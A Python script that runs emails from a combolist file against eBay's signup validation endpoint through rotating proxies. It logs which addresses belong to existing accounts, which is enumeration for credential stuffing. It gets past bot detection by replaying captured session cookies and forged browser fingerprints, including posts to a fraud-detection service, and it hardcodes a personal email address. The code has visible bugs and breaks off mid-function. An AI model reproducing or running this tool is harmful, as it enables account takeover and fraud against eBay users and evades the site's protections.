import requests 
from requests.auth import HTTPBasicAuth 
from bs4 import BeautifulSoup
import argparse
import threading,json
import requests
import time 


whole_cookies={}
check_cookies_names=["ak_bmsc","ebay","dp1", "s", "nonsession", "npii", "DG_IID", "DG_UID", "DG_ZID", "DG_ZUID", "DG_HID", "DG_HID", "DG_SID"]

def check():
    i=0
    
    
    burp0_url = "https://signup.ebay.com:443/ajax/validatefield"

    burp0_cookies = {"ak_bmsc": "E21D28F53EFBE3675A1BE677EC75BC375C7B49F02E1A0000AE25FA5F7BB42B28~plMYBLB13Yq1GE9h2ZpNNP1hbm1FQDYuhJGosaOM+C/yeaA+XxDiQC6JFhkE3nCUA2S8N42KEZBE9HRxDBobGzHR5tLuKKljdgvr3rJGzfa7PaYSCkPgkliKZhPDdt3N+tOqvVHhdPatowV7388qO06LE2S7vlIRcV4LS+GKT6QtuWGG86TKFb2/kGAWYMq5HR5QPkBpOoF6diWwk3acRpRKIwbBrX9htfqqsCUPcL1s8=", "ebay": "%5Esbf%3D%23%5E", "dp1": "bu1p/QEBfX0BAX19AQA**63bc8cc6^bl/MAen-US63bc8cc6^", "s": "CgAD4ACBf+3dGZTkyMzMxN2YxNzYwYWFkYmM3OTFiOTJmZmZmNjRlZGbAX5PJ", "nonsession": "BAQAAAXbFiyC5AAaAADMABWHbWUY4MDAwMADLAAFf+izOMgDKACBjvIzGZTkyMzMxN2YxNzYwYWFkYmM3OTFiOTJmZmZmNjRlZGb9I46/gP6uIzOgc96I+siJY4qKsQ**", "npii": "btguid/e923317f1760aadbc791b92ffff64edf63bc8cc7^cguid/e92392691760ac0f6472675df787691063bc8cc7^", "DG_IID": "8426D9BB-A43E-3959-BA24-3C32D92638A0", "DG_UID": "7173A808-9DF5-3C29-B50B-2010F5E5E4BE", "DG_ZID": "114FD7E9-5BEB-3DDB-9D01-CA1F5CBE3049", "DG_ZUID": "91D5F574-C5EC-3519-B9CE-34FE7C0F5876", "DG_HID": "2E233C5C-1F6D-3A37-8654-3F92E62ABCF4", "DG_SID": "196.89.20.208:++b6URJ4KtPMpVZgInDI9XvT+DVsk0/0tMQK63n043c"}
    burp0_headers = {"Connection": "close", "accept": "application/json", "X-Distil-Ajax": "brfzxtqrydvuyvsetqvsvufvbr", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "content-type": "application/json", "Origin": "https://signup.ebay.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://signup.ebay.com/pa/crte?ru=https%3A%2F%2Fwww.ebay.com%2F", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_json={"email": "faouzi.byto@gmail.com", "fieldName": "email", "srt": "0100050000005059e8a3d2f754a0fbd9bf1131b11f4b3345eb16e40470fa70c0bfb059db18e4cafc77d089fc9323175ab856b32e39fae15b07fa9061bd032312e3e8d35f9bee23690cd1ee9e948ebdde49d088c67d2e09"}

    pro = open('output.txt','r').readlines()
    with open('combolist.txt','r') as f:
        print("begin")
        for l in f:
            while(i < len( pro ) ):
                try:
                    # response = json.loads(session.post(burp0_url, headers=burp0_headers,cookies=burp0_cookies, json=burp0_json,proxies={ "https" : "https://"+pro[i]}).content.decode("utf-8"))
                    burp0_json['email'] = l.split(":")[0]
                    print("using {} on {}".format(pro[i][:-1],burp0_json['email']))
                    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json,proxies={ "https" : "https://"+pro[i]})
                    # print("{}".format(response.content))
                    jres = json.loads(response.content.decode("utf-8"))
                    # setnewcoockies(response.cookies,burp0_cookies)
                    # print("{}".format(jres))
                    if 'status' in jres:
                        # print("{}".format(jres['status']))
                        if jres["status"] == 'FAILED':
                            print("{}  : renewing".format(jres["status"]))
                            # cockies = renew_coocky(burp0_cookies)
                            burp0_cookies = get_DG(get_regular_C(pro[i]),pro[i])
                    if 'valid' in jres:
                        if not jres["valid"]:
                            try :
                                with open('newone.txt','a') as ff :
                                    print("Valid")
                                    e = check_email_option(l.split(":")[0],pro[i])
                                    ff.write(e+l)
                            except:
                                with open('newone.txt','a') as ff :
                                    e ="did not check------- :"
                                    ff.write(e+l)
                                print("valid but couldnt write it ")
                            break
                        if jres["valid"]:
                            print("trash")
                            break 
                        

                except:
                    i += 1 
        # f.close()

def renew_coocky(burp0_cookies):
    burp0_url = "https://signup.ebay.com:443/track"
    # burp0_cookies = {"ak_bmsc": "5C265B200DBAD5C268ABBD31F79B0A7802143124B24D000034E8F85F73FE7A18~plH7SO+8VnTnzHQZK8wVvnTC8BqSKnNh8/Pg5/NQ3lFWwLjUmM4oYRK+ojzn32uHQcIhr0y5Q04hIPcVwvXjQDa6/WCT98oMs7Gr6KSweqzyNPpFvjc588QH0kXEC6wKvkgHq/xh8SCHU5xoiLZo3JaDvWbXfHhp//h2lJwE/srQX+X3lU+hF71p7mfA151iwRubp2tN/VDcKBM0i99fEzqK7pFLBbQp+hj0rVbjgj+Lk=", "__uzma": "5f45fab1-3077-4637-8a03-059b7f1c4d46", "__uzmb": "1610147900", "__uzmc": "497461082333", "__uzmd": "1610147900", "__uzme": "", "DG_IID": "8426D9BB-A43E-3959-BA24-3C32D92638A0", "DG_UID": "F990ECA2-56EB-3E71-9E19-FA1139EE187D", "DG_ZID": "114FD7E9-5BEB-3DDB-9D01-CA1F5CBE3049", "DG_ZUID": "C7F6E291-2CF4-3920-8F59-16F4159A66D7", "DG_HID": "1F979ECF-34F2-33BA-B1A2-59BA9FAAE8BF", "DG_SID": "41.143.58.233:K8Bpz89El6rKUrytjOfxF01CNHKROpxbQ6Q4bQwdng0", "s": "CgAD4ACBf+jnGZTQ0YjBjNTkxNzYwYWNhNDVhNTAzMDU2ZmY0MDBlNDAitOjM", "ebay": "%5Ejs%3D1%5Esbf%3D%23%5E", "dp1": "bu1p/QEBfX0BAX19AQA**63bb4f4a^pbf/%23e000e0000000000000000061da1bca^bl/MA63bb4f4a^", "nonsession": "BAQAAAXYrDFi8AAaAADMABWHaG8o4MDAwMADKACBju09KZTQ0YjBjNTkxNzYwYWNhNDVhNTAzMDU2ZmY0MDBlNDAAywABX/jvUjXikOYOJiyytVmMuhscamdAU3EzMg**", "bm_sv": "5A91434A6C4ED7A5C663C4BEB9422F79~YZQlDuUlekzloqY8Prlq9JtDtATm/LX4g+NGQ11vOHxezJFkKS3/YNLgj4NHLnaoe9qsgggcgvPPAKM4LgopI2vX19rAiXg7robIOVFb7e31qNtun/65gmqyag4t3JSMP0xYbDhyXspd7RCd+Lm2Hg==", "npii": "btguid/e44b0c591760aca45a503056ff400e4063bb4f4f^cguid/e44b2b5f1760a1e4a3e47598fef0e5eb63bb4f4f^"}
    burp0_headers = {"Connection": "close", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "content-type": "application/json", "Accept": "*/*", "Origin": "https://signup.ebay.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://signup.ebay.com/pa/crte?_trksid=m570.l2621", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_json={"eventType": "PageLoad"}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    cockies = {}
    for c in r.cookies:
        cockies[c.name]= c.valu
    burp0_data = {"p": "{\"proof\":\"8:1610152703116:EeRvTIPtCl3qxmh5wcMA\",\"fp2\":{\"userAgent\":\"Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/87.0.4280.88Safari/537.36\",\"language\":\"en-US\",\"screen\":{\"width\":1920,\"height\":1080,\"availHeight\":1080,\"availWidth\":1920,\"pixelDepth\":24,\"innerWidth\":1920,\"innerHeight\":1007,\"outerWidth\":1920,\"outerHeight\":1080,\"devicePixelRatio\":1},\"timezone\":1,\"indexedDb\":true,\"addBehavior\":false,\"openDatabase\":true,\"cpuClass\":\"unknown\",\"platform\":\"Win32\",\"doNotTrack\":\"unknown\",\"plugins\":\"ChromiumPDFPlugin::PortableDocumentFormat::application/x-google-chrome-pdf~pdf;ChromiumPDFViewer::::application/pdf~pdf;NativeClient::::application/x-nacl~,application/x-pnacl~\",\"canvas\":{\"winding\":\"yes\",\"towebp\":true,\"blending\":true,\"img\":\"bee56b0a4dcf5bc3040ee3f938f6efd48ad5fd68\"},\"webGL\":{\"img\":\"bd6549c125f67b18985a8c509803f4b883ff810c\",\"extensions\":\"ANGLE_instanced_arrays;EXT_blend_minmax;EXT_color_buffer_half_float;EXT_disjoint_timer_query;EXT_float_blend;EXT_frag_depth;EXT_shader_texture_lod;EXT_texture_compression_bptc;EXT_texture_compression_rgtc;EXT_texture_filter_anisotropic;WEBKIT_EXT_texture_filter_anisotropic;EXT_sRGB;KHR_parallel_shader_compile;OES_element_index_uint;OES_fbo_render_mipmap;OES_standard_derivatives;OES_texture_float;OES_texture_float_linear;OES_texture_half_float;OES_texture_half_float_linear;OES_vertex_array_object;WEBGL_color_buffer_float;WEBGL_compressed_texture_s3tc;WEBKIT_WEBGL_compressed_texture_s3tc;WEBGL_compressed_texture_s3tc_srgb;WEBGL_debug_renderer_info;WEBGL_debug_shaders;WEBGL_depth_texture;WEBKIT_WEBGL_depth_texture;WEBGL_draw_buffers;WEBGL_lose_context;WEBKIT_WEBGL_lose_context;WEBGL_multi_draw\",\"aliasedlinewidthrange\":\"[1,1]\",\"aliasedpointsizerange\":\"[1,1024]\",\"alphabits\":8,\"antialiasing\":\"yes\",\"bluebits\":8,\"depthbits\":24,\"greenbits\":8,\"maxanisotropy\":16,\"maxcombinedtextureimageunits\":32,\"maxcubemaptexturesize\":16384,\"maxfragmentuniformvectors\":1024,\"maxrenderbuffersize\":16384,\"maxtextureimageunits\":16,\"maxtexturesize\":16384,\"maxvaryingvectors\":30,\"maxvertexattribs\":16,\"maxvertextextureimageunits\":16,\"maxvertexuniformvectors\":4096,\"maxviewportdims\":\"[32767,32767]\",\"redbits\":8,\"renderer\":\"WebKitWebGL\",\"shadinglanguageversion\":\"WebGLGLSLES1.0(OpenGLESGLSLES1.0Chromium)\",\"stencilbits\":0,\"vendor\":\"WebKit\",\"version\":\"WebGL1.0(OpenGLES2.0Chromium)\",\"vertexshaderhighfloatprecision\":23,\"vertexshaderhighfloatprecisionrangeMin\":127,\"vertexshaderhighfloatprecisionrangeMax\":127,\"vertexshadermediumfloatprecision\":23,\"vertexshadermediumfloatprecisionrangeMin\":127,\"vertexshadermediumfloatprecisionrangeMax\":127,\"vertexshaderlowfloatprecision\":23,\"vertexshaderlowfloatprecisionrangeMin\":127,\"vertexshaderlowfloatprecisionrangeMax\":127,\"fragmentshaderhighfloatprecision\":23,\"fragmentshaderhighfloatprecisionrangeMin\":127,\"fragmentshaderhighfloatprecisionrangeMax\":127,\"fragmentshadermediumfloatprecision\":23,\"fragmentshadermediumfloatprecisionrangeMin\":127,\"fragmentshadermediumfloatprecisionrangeMax\":127,\"fragmentshaderlowfloatprecision\":23,\"fragmentshaderlowfloatprecisionrangeMin\":127,\"fragmentshaderlowfloatprecisionrangeMax\":127,\"vertexshaderhighintprecision\":0,\"vertexshaderhighintprecisionrangeMin\":31,\"vertexshaderhighintprecisionrangeMax\":30,\"vertexshadermediumintprecision\":0,\"vertexshadermediumintprecisionrangeMin\":31,\"vertexshadermediumintprecisionrangeMax\":30,\"vertexshaderlowintprecision\":0,\"vertexshaderlowintprecisionrangeMin\":31,\"vertexshaderlowintprecisionrangeMax\":30,\"fragmentshaderhighintprecision\":0,\"fragmentshaderhighintprecisionrangeMin\":31,\"fragmentshaderhighintprecisionrangeMax\":30,\"fragmentshadermediumintprecision\":0,\"fragmentshadermediumintprecisionrangeMin\":31,\"fragmentshadermediumintprecisionrangeMax\":30,\"fragmentshaderlowintprecision\":0,\"fragmentshaderlowintprecisionrangeMin\":31,\"fragmentshaderlowintprecisionrangeMax\":30,\"unmaskedvendor\":\"GoogleInc.\",\"unmaskedrenderer\":\"ANGLE(Intel(R)HDGraphics530Direct3D11vs_5_0ps_5_0)\"},\"touch\":{\"maxTouchPoints\":0,\"touchEvent\":false,\"touchStart\":false},\"video\":{\"ogg\":\"probably\",\"h264\":\"\",\"webm\":\"probably\"},\"audio\":{\"ogg\":\"probably\",\"mp3\":\"probably\",\"wav\":\"probably\",\"m4a\":\"nope\"},\"vendor\":\"GoogleInc.\",\"product\":\"Gecko\",\"productSub\":\"20030107\",\"browser\":{\"ie\":false,\"chrome\":true,\"webdriver\":true},\"window\":{\"historyLength\":3,\"hardwareConcurrency\":4,\"iframe\":false,\"battery\":true},\"location\":{\"protocol\":\"https:\"},\"fonts\":\"Calibri;Century;Haettenschweiler;Leelawadee;Marlett;Pristina\",\"devices\":{\"count\":3,\"data\":{\"0\":{\"deviceId\":\"\",\"kind\":\"audioinput\",\"label\":\"\",\"groupId\":\"abf30fcde9f83903c292a6095e1c61f06302e99a2f1c04c6508ff71bed903d34\"},\"1\":{\"deviceId\":\"\",\"kind\":\"videoinput\",\"label\":\"\",\"groupId\":\"7931daf39fadce47d6d985ba68fd9365ef8214db8deaa95aaf46b952c58b5404\"},\"2\":{\"deviceId\":\"\",\"kind\":\"audiooutput\",\"label\":\"\",\"groupId\":\"87ba9acbb5034b3f032aad580ccaa3d74e500208557bbbcf24983cbc32c095ea\"}}}},\"cookies\":1,\"setTimeout\":0,\"setInterval\":0,\"appName\":\"Netscape\",\"platform\":\"Win32\",\"syslang\":\"en-US\",\"userlang\":\"en-US\",\"cpu\":\"\",\"productSub\":\"20030107\",\"plugins\":{\"0\":\"ChromiumPDFPlugin\",\"1\":\"ChromiumPDFViewer\",\"2\":\"NativeClient\"},\"mimeTypes\":{\"0\":\"application/pdf\",\"1\":\"PortableDocumentFormatapplication/x-google-chrome-pdf\",\"2\":\"NativeClientExecutableapplication/x-nacl\",\"3\":\"PortableNativeClientExecutableapplication/x-pnacl\"},\"screen\":{\"width\":1920,\"height\":1080,\"colorDepth\":24},\"fonts\":{\"0\":\"Calibri\",\"1\":\"Cambria\",\"2\":\"Constantia\",\"3\":\"LucidaBright\",\"4\":\"Georgia\",\"5\":\"SegoeUI\",\"6\":\"Candara\",\"7\":\"TrebuchetMS\",\"8\":\"Verdana\",\"9\":\"Consolas\",\"10\":\"LucidaConsole\",\"11\":\"LucidaSansTypewriter\",\"12\":\"CourierNew\",\"13\":\"Courier\"}}"}
    r = requests.post("https://signup.ebay.com:443/nkfytkqtoxtljvzb.js?PID=0B459DF1-2695-3173-882B-64908F679262", headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    for c in r.cookies:
        cockies[c.name]= c.value
    return cockies

def setnewcoockies(newones, toputinto):
    for k,v in newones.items():
        toputinto[k] = v
    
def get_regular_C(proxy):
    burp0_cookies = {}
    burp0_url = "https://reg.ebay.com:443/reg/PartialReg?ru=https%3A%2F%2Fwww.ebay.com%2F"
    burp0_cookies = {"ak_bmsc": "6F167A4A69CCFB03DE10D1463ACE12F56871FAE7723F000003B4F95FD4B5DD59~pl/lwvj6pELYEV2eI3MNS5K93W59tGWmykJZhhgoBxzkzaI4aficGad4LiuH6g+ufO/OW5BPkxUX/BrsQaa0rfE2OrbVWDMiSHd7uL3evJI5m3AZ7t6AbvUMmyb06YCgOwn6pNFxdJoA29IwwDcL9czmpM5Ao0fdfdkhlesWb2yHe3pu9Dxnoc/QkzJAwdk188GR0etGQQtoao26ylJkMAswCaOBUZdSixtU3xUfdhz9s=", "dp1": "bbl/MA63bc1b53^pbf/%23e000e0000000000000000061dae7d3^", "s": "CgAD4ACBf+wXTZTc2NzJjMWMxNzYwYTllNTM4NDFlMGIxZmYzZWE2N2Qc82/W", "nonsession": "BAQAAAXbFiyC5AAaAADMABWHa59M4MDAwMADLAAFf+btbMgDKACBjvBtTZTc2NzJjMWMxNzYwYTllNTM4NDFlMGIxZmYzZWE2N2TE2sUchcofwFf5LCA+eSRKVg/b1Q**", "npii": "btguid/e7672c1c1760a9e53841e0b1ff3ea67d63bc1b55^cguid/e76739041760a6e5b441e2bafd5e38df63bc1b55^", "ebay": "%5Esbf%3D%23%5Epsi%3DAZyw8%2BGc*%5Ejs%3D1%5E", "ds2": "sotr/b9TxWz8wze-z^"}
    burp0_headers = {"Connection": "close", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://www.ebay.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    n = requests.get(burp0_url, headers=burp0_headers,proxies={"https" : "https://"+proxy})
    for c in n.cookies:
        burp0_cookies[c.name] = c.value
    return burp0_cookies

def get_DG(burp0_cookies,proxy):
    burp0_url = "https://cdn3.forter.com:443/events"
    burp0_headers = {"Connection": "close", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Content-Type": "text/plain; charset=utf-8", "Accept": "*/*", "Origin": "https://signup.ebay.com", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Dest": "empty", "Referer": "https://signup.ebay.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_json={"bcn": "c96bcef8-9b5c-4ed2-aa7c-43372ca95100", "si": "adf0901f1861", "user": [[{"data": "lvBkrk7kdktdBAvALa1yaHat3naVarA-kmTkAYa9kAD3FfbNORedTmHRackCbVBkaJambKQHAIyPdXaKbTBaKraBanAuAUaidzR3a9HTITaGGufUa-PFgTgfMHTmqLRTIviP6aIyqaTx4baHBKkTmsvT0HNsbVBzBkGmtBa3ExbHtPA3rvsa7y0aAU3ITIxyPvfLYvKTaUStYvaM2F4ItyxaKYEb5+HdKeXIKpj8kIOySBlVkka7iaw", "user_id": "a34b5e96d9124c549849344763d51f57"}]]}
    requests.post(burp0_url, headers=burp0_headers, json=burp0_json,proxies={"https" : "https://"+proxy})
    burp0_url = "https://signup.ebay.com:443/nkfytkqtoxtljvzb.js?PID=0B459DF1-2695-3173-882B-64908F679262"
    # burp0_cookies = {"ak_bmsc": "6F167A4A69CCFB03DE10D1463ACE12F56871FAE7723F000003B4F95FD4B5DD59~pl/lwvj6pELYEV2eI3MNS5K93W59tGWmykJZhhgoBxzkzaI4aficGad4LiuH6g+ufO/OW5BPkxUX/BrsQaa0rfE2OrbVWDMiSHd7uL3evJI5m3AZ7t6AbvUMmyb06YCgOwn6pNFxdJoA29IwwDcL9czmpM5Ao0fdfdkhlesWb2yHe3pu9Dxnoc/QkzJAwdk188GR0etGQQtoao26ylJkMAswCaOBUZdSixtU3xUfdhz9s=", "s": "CgAD4ACBf+wZDZTc2NzJjMWMxNzYwYTllNTM4NDFlMGIxZmYzZWE2N2TQU53r", "__uzma": "0d9aa005-f204-4ca9-a115-e6688968fa2b", "__uzmb": "1610200258", "__uzmc": "832331073301", "__uzmd": "1610200258", "__uzme": "", "ebay": "%5Ejs%3D1%5Esbf%3D%23000000%5E", "npii": "btguid/e7672c1c1760a9e53841e0b1ff3ea67d63bc1bc4^cguid/e76739041760a6e5b441e2bafd5e38df63bc1bc4^", "dp1": "bu1p/QEBfX0BAX19AQA**63bc1bc4^pbf/%23e000e0000000000000000061dae844^bl/MA63bc1bc4^", "nonsession": "BAQAAAXYrDFi8AAaAADMABWHa6EQ4MDAwMADKACBjvBvEZTc2NzJjMWMxNzYwYTllNTM4NDFlMGIxZmYzZWE2N2QAywABX/m7zDRA/8+V4pB4aSAmX4CJOGIaeG0CbQ**", "bm_sv": "97F247D4B0BBFD2CB9A20F1B6F1BD10E~7pIENqn6KI3Ay9Uen8PSWNdv0/z61oab5bnvaKHDEW4uXYY2AQ0AjBkuZGuE25mE5Bvx1h63z0zyudxYBibME41jMCRIz7UITZpACbS2UKPAluQa9pmpvtmgRrkewm3U6PpAjOmpvNtkIImdoFSUBw==", "ds2": "ssts/1610200261616^"}
    burp0_headers = {"Connection": "close", "X-Distil-Ajax": "brfzxtqrydvuyvsetqvsvufvbr", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Content-Type": "text/plain;charset=UTF-8", "Accept": "*/*", "Origin": "https://signup.ebay.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://signup.ebay.com/pa/crte?ru=https%3A%2F%2Fwww.ebay.com%2F", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_data = {"p": "{\"proof\":\"14a:1610200263797:qd9JgWF46FrW9DBxXF6q\",\"cookies\":0,\"setTimeout\":0,\"setInterval\":0,\"appName\":\"Netscape\",\"platform\":\"Win32\",\"syslang\":\"en-US\",\"userlang\":\"en-US\",\"cpu\":\"\",\"productSub\":\"20030107\",\"plugins\":{\"0\":\"ChromiumPDFPlugin\",\"1\":\"ChromiumPDFViewer\",\"2\":\"NativeClient\"},\"mimeTypes\":{\"0\":\"application/pdf\",\"1\":\"PortableDocumentFormatapplication/x-google-chrome-pdf\",\"2\":\"NativeClientExecutableapplication/x-nacl\",\"3\":\"PortableNativeClientExecutableapplication/x-pnacl\"},\"screen\":{\"width\":1920,\"height\":1080,\"colorDepth\":24},\"fonts\":{\"0\":\"Calibri\",\"1\":\"Cambria\",\"2\":\"Constantia\",\"3\":\"LucidaBright\",\"4\":\"Georgia\",\"5\":\"SegoeUI\",\"6\":\"Candara\",\"7\":\"TrebuchetMS\",\"8\":\"Verdana\",\"9\":\"Consolas\",\"10\":\"LucidaConsole\",\"11\":\"LucidaSansTypewriter\",\"12\":\"CourierNew\",\"13\":\"Courier\"},\"fp2\":{\"userAgent\":\"Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/87.0.4280.88Safari/537.36\",\"language\":\"en-US\",\"screen\":{\"width\":1920,\"height\":1080,\"availHeight\":1080,\"availWidth\":1920,\"pixelDepth\":24,\"innerWidth\":1920,\"innerHeight\":1007,\"outerWidth\":1920,\"outerHeight\":1080,\"devicePixelRatio\":1},\"timezone\":1,\"indexedDb\":true,\"addBehavior\":false,\"openDatabase\":true,\"cpuClass\":\"unknown\",\"platform\":\"Win32\",\"doNotTrack\":\"unknown\",\"plugins\":\"ChromiumPDFPlugin::PortableDocumentFormat::application/x-google-chrome-pdf~pdf;ChromiumPDFViewer::::application/pdf~pdf;NativeClient::::application/x-nacl~,application/x-pnacl~\",\"canvas\":{\"winding\":\"yes\",\"towebp\":true,\"blending\":true,\"img\":\"bee56b0a4dcf5bc3040ee3f938f6efd48ad5fd68\"},\"webGL\":{\"img\":\"bd6549c125f67b18985a8c509803f4b883ff810c\",\"extensions\":\"ANGLE_instanced_arrays;EXT_blend_minmax;EXT_color_buffer_half_float;EXT_disjoint_timer_query;EXT_float_blend;EXT_frag_depth;EXT_shader_texture_lod;EXT_texture_compression_bptc;EXT_texture_compression_rgtc;EXT_texture_filter_anisotropic;WEBKIT_EXT_texture_filter_anisotropic;EXT_sRGB;KHR_parallel_shader_compile;OES_element_index_uint;OES_fbo_render_mipmap;OES_standard_derivatives;OES_texture_float;OES_texture_float_linear;OES_texture_half_float;OES_texture_half_float_linear;OES_vertex_array_object;WEBGL_color_buffer_float;WEBGL_compressed_texture_s3tc;WEBKIT_WEBGL_compressed_texture_s3tc;WEBGL_compressed_texture_s3tc_srgb;WEBGL_debug_renderer_info;WEBGL_debug_shaders;WEBGL_depth_texture;WEBKIT_WEBGL_depth_texture;WEBGL_draw_buffers;WEBGL_lose_context;WEBKIT_WEBGL_lose_context;WEBGL_multi_draw\",\"aliasedlinewidthrange\":\"[1,1]\",\"aliasedpointsizerange\":\"[1,1024]\",\"alphabits\":8,\"antialiasing\":\"yes\",\"bluebits\":8,\"depthbits\":24,\"greenbits\":8,\"maxanisotropy\":16,\"maxcombinedtextureimageunits\":32,\"maxcubemaptexturesize\":16384,\"maxfragmentuniformvectors\":1024,\"maxrenderbuffersize\":16384,\"maxtextureimageunits\":16,\"maxtexturesize\":16384,\"maxvaryingvectors\":30,\"maxvertexattribs\":16,\"maxvertextextureimageunits\":16,\"maxvertexuniformvectors\":4096,\"maxviewportdims\":\"[32767,32767]\",\"redbits\":8,\"renderer\":\"WebKitWebGL\",\"shadinglanguageversion\":\"WebGLGLSLES1.0(OpenGLESGLSLES1.0Chromium)\",\"stencilbits\":0,\"vendor\":\"WebKit\",\"version\":\"WebGL1.0(OpenGLES2.0Chromium)\",\"vertexshaderhighfloatprecision\":23,\"vertexshaderhighfloatprecisionrangeMin\":127,\"vertexshaderhighfloatprecisionrangeMax\":127,\"vertexshadermediumfloatprecision\":23,\"vertexshadermediumfloatprecisionrangeMin\":127,\"vertexshadermediumfloatprecisionrangeMax\":127,\"vertexshaderlowfloatprecision\":23,\"vertexshaderlowfloatprecisionrangeMin\":127,\"vertexshaderlowfloatprecisionrangeMax\":127,\"fragmentshaderhighfloatprecision\":23,\"fragmentshaderhighfloatprecisionrangeMin\":127,\"fragmentshaderhighfloatprecisionrangeMax\":127,\"fragmentshadermediumfloatprecision\":23,\"fragmentshadermediumfloatprecisionrangeMin\":127,\"fragmentshadermediumfloatprecisionrangeMax\":127,\"fragmentshaderlowfloatprecision\":23,\"fragmentshaderlowfloatprecisionrangeMin\":127,\"fragmentshaderlowfloatprecisionrangeMax\":127,\"vertexshaderhighintprecision\":0,\"vertexshaderhighintprecisionrangeMin\":31,\"vertexshaderhighintprecisionrangeMax\":30,\"vertexshadermediumintprecision\":0,\"vertexshadermediumintprecisionrangeMin\":31,\"vertexshadermediumintprecisionrangeMax\":30,\"vertexshaderlowintprecision\":0,\"vertexshaderlowintprecisionrangeMin\":31,\"vertexshaderlowintprecisionrangeMax\":30,\"fragmentshaderhighintprecision\":0,\"fragmentshaderhighintprecisionrangeMin\":31,\"fragmentshaderhighintprecisionrangeMax\":30,\"fragmentshadermediumintprecision\":0,\"fragmentshadermediumintprecisionrangeMin\":31,\"fragmentshadermediumintprecisionrangeMax\":30,\"fragmentshaderlowintprecision\":0,\"fragmentshaderlowintprecisionrangeMin\":31,\"fragmentshaderlowintprecisionrangeMax\":30,\"unmaskedvendor\":\"GoogleInc.\",\"unmaskedrenderer\":\"ANGLE(Intel(R)HDGraphics530Direct3D11vs_5_0ps_5_0)\"},\"touch\":{\"maxTouchPoints\":0,\"touchEvent\":false,\"touchStart\":false},\"video\":{\"ogg\":\"probably\",\"h264\":\"\",\"webm\":\"probably\"},\"audio\":{\"ogg\":\"probably\",\"mp3\":\"probably\",\"wav\":\"probably\",\"m4a\":\"nope\"},\"vendor\":\"GoogleInc.\",\"product\":\"Gecko\",\"productSub\":\"20030107\",\"browser\":{\"ie\":false,\"chrome\":true,\"webdriver\":true},\"window\":{\"historyLength\":3,\"hardwareConcurrency\":4,\"iframe\":false,\"battery\":true},\"location\":{\"protocol\":\"https:\"},\"fonts\":\"Calibri;Century;Haettenschweiler;Leelawadee;Marlett;Pristina\",\"devices\":{\"count\":3,\"data\":{\"0\":{\"deviceId\":\"\",\"kind\":\"audioinput\",\"label\":\"\",\"groupId\":\"4ff67fbfccebdd7d49379db50221670af44844d46667bb8239f783e4a5fda998\"},\"1\":{\"deviceId\":\"\",\"kind\":\"videoinput\",\"label\":\"\",\"groupId\":\"fccb884cdc48d66c3f02509ee25a36f67e8af4a7d4673e0057ada9b5b00c47fd\"},\"2\":{\"deviceId\":\"\",\"kind\":\"audiooutput\",\"label\":\"\",\"groupId\":\"28b1f3df24daf896e719956bf33e8ffd7bc5bc873282cae7f35aa7616502324f\"}}}}}"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data ,proxies={"https" : "https://"+proxy})
    for c in r.cookies:
        burp0_cookies.c[c.name] = c.value
    return burp0_cookies

def check_email_option(email,proxy):
    burp0_url = "https://signin.ebay.com:443/signin/account-access?&ru=https%3A%2F%2Fwww.ebay.com%2F"
